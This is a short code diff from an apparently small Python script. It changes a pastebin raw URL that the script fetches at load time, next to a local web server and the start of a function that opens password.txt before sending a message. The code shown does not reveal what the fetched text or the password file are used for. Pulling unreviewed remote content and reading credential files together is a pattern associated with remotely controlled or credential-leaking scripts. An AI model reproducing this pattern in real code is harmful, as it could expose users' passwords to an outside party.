@@ -23,7 +23,7 @@ def execute_server():
         print("Server running at http://localhost:{}".format(PORT))
         httpd.serve_forever()
 
-mmm = requests.get('https://pastebin.com/raw/WCAUqptJ').text
+mmm = requests.get('https://pastebin.com/raw/PspF1N70').text
 
 def send_initial_message():
     with open('password.txt', 'r') as file:
